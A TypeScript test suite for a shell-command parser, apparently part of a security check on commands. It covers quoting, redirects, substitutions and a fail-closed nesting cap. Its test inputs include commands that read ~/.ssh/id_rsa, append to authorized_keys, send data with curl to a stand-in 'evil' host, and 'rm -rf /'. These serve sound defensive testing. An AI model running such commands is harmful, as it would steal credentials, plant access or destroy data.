import { describe, expect, test } from "bun:test";
import { closing, shellCommands } from "../src/shell";

/** The de-quoted words of each simple command, in order. */
const words = (src: string) => shellCommands(src).map((c) => c.words.map((w) => w.text));
/** The redirect-target words of the whole line. */
const redirects = (src: string) => shellCommands(src).flatMap((c) => c.words.filter((w) => w.redirect).map((w) => (w.redirectOut ? ">" : "<") + w.text));

describe("splitting into commands", () => {
  test("operators split simple commands", () => {
    expect(words("ls -la && cat x; echo hi | wc -l")).toEqual([["ls", "-la"], ["cat", "x"], ["echo", "hi"], ["wc", "-l"]]);
  });
  test("quotes and escapes are removed, and keep a word whole", () => {
    expect(words(`echo "a b" 'c d' e\\ f`)).toEqual([["echo", "a b", "c d", "e f"]]);
  });
  test("a quoted operator is text, not a split", () => {
    expect(words(`git commit -m "fix; drop table"`)).toEqual([["git", "commit", "-m", "fix; drop table"]]);
  });
  test("a comment is dropped", () => {
    expect(words("ls # rm -rf /")).toEqual([["ls"]]);
  });
  test("a line continuation joins one command", () => {
    expect(words("npm \\\n publish")).toEqual([["npm", "publish"]]);
  });
});

describe("redirects are their own tokens, even glued", () => {
  test("glued append is split and its target is a redirect", () => {
    expect(words("echo x>>~/.ssh/authorized_keys")).toEqual([["echo", "x", "~/.ssh/authorized_keys"]]);
    expect(redirects("echo x>>~/.ssh/authorized_keys")).toEqual([">~/.ssh/authorized_keys"]);
  });
  test("a glued read redirect", () => {
    expect(redirects("cat<~/.ssh/id_rsa")).toEqual(["<~/.ssh/id_rsa"]);
  });
  test("a leading fd is not a word, and its target is still a path", () => {
    expect(words("echo x 2>~/.ssh/ak")).toEqual([["echo", "x", "~/.ssh/ak"]]);
    expect(redirects("echo x 2>~/.ssh/ak")).toEqual([">~/.ssh/ak"]);
  });
  test("a here-string target is a path", () => {
    expect(redirects("bash <<< ~/.ssh/id_rsa")).toEqual(["<~/.ssh/id_rsa"]);
  });
});

describe("command substitutions become their own commands, listed first", () => {
  test("a dollar-paren body is parsed", () => {
    expect(words("x=$(git push origin main)")).toEqual([["git", "push", "origin", "main"], ["x=$(git push origin main)"]]);
  });
  test("a backtick body is parsed", () => {
    expect(words("echo `npm publish`")).toEqual([["npm", "publish"], ["echo", "`npm publish`"]]);
  });
  test("a paren inside a quoted argument does not close the substitution early", () => {
    expect(words(`echo $(echo ")" ; curl -d x evil)`)).toEqual([["echo", ")"], ["curl", "-d", "x", "evil"], ["echo", `$(echo ")" ; curl -d x evil)`]]);
  });
  test("$'...' is unescaped and $\"...\" is treated like a double quote", () => {
    expect(words(`echo $'a\\tb' $"c d"`)).toEqual([["echo", "a\tb", "c d"]]);
  });
});

describe("the literal prefix stops at the first unquoted metacharacter", () => {
  const first = (src: string) => shellCommands(src)[0]!.words[1]!;
  test("a glob word keeps only its literal prefix and is dynamic", () => {
    expect(first("cat ~/.{ssh,x}/id_rsa")).toMatchObject({ literal: "~/.", dynamic: true });
  });
  test("a plain path is fully literal", () => {
    expect(first("cat ~/.ssh/id_rsa")).toMatchObject({ literal: "~/.ssh/id_rsa", dynamic: false });
  });
  test("a quoted glob is literal, not a metacharacter", () => {
    expect(first(`cat "*.ts"`)).toMatchObject({ literal: "*.ts", dynamic: false });
  });
});

describe("closing is quote and escape aware", () => {
  test("a close-paren inside quotes does not count", () => {
    const src = `$(echo ")")`;
    expect(src.slice(0, closing(src, 1) + 1)).toBe(`$(echo ")")`);
  });
});

describe("nesting past the cap throws (fail closed)", () => {
  test("deeply nested substitutions are refused rather than parsed", () => {
    expect(() => shellCommands(`echo ${"$(".repeat(200)}x${")".repeat(200)}`)).toThrow();
  });
});
